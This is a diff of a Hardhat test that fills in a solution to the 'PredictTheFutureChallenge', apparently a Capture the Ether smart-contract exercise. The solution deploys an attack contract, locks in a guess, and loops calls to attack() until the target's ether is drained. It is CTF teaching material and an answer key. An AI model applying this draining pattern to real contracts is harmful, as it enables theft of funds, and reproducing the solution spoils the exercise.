@@ -24,9 +24,27 @@ describe('PredictTheFutureChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    let targetSolver: Contract;
+
+    targetSolver = await (
+      await ethers.getContractFactory('PredictTheFutureAttack', attacker)
+    ).deploy(target.address, {
+      value: utils.parseEther('1'),
+    });
+
+    // console.log('Target Solver owner: ', await targetSolver.owner());
+    console.log('Attacker: ', attacker.address);
+
+    targetSolver = await targetSolver.connect(attacker);
+    await targetSolver.lockInGuess({value: utils.parseEther('1')});
+    while(!(await target.isComplete())) {
+      try {
+        await targetSolver.attack();
+      } catch (err) {
+        // console.log(err);
+      }
+    }
+
 
     expect(await provider.getBalance(target.address)).to.equal(0);
     expect(await target.isComplete()).to.equal(true);
